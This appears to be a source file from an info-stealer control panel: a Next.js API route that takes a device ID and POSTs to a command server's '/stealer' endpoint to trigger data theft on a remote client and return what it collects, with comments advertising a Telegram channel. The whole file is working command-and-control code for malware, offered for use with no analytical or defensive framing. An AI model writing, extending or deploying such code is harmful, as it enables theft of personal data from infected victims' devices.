// t.me/SentinelLinks

import { type NextRequest, NextResponse } from "next/server"

const WS_SERVER_URL = process.env.GROB_WS_SERVER_URL || "http://localhost:8765"

export async function POST(request: NextRequest) {
  try {
    const { deviceId } = await request.json()

    if (!deviceId) {
      return NextResponse.json({ error: "Device ID required" }, { status: 400 })
    }

// t.me/SentinelLinks
    const response = await fetch(`${WS_SERVER_URL}/stealer`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ clientId: deviceId }),
      signal: AbortSignal.timeout(35000),
    })

    const result = await response.json()

    if (!response.ok) {
      return NextResponse.json({ success: false, error: result.error || "Server error" }, { status: response.status })
    }

    return NextResponse.json({
      success: true,
      data: result.data || {},
    })
  } catch (error: any) {
    console.error("Stealer API error:", error)

// t.me/SentinelLinks
    if (error.name === "TimeoutError" || error.name === "AbortError") {
      return NextResponse.json({ success: false, error: "Timeout - client offline or slow" }, { status: 408 })
    }

    return NextResponse.json({ success: false, error: error.message || "Failed to execute stealer" }, { status: 500 })
  }
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
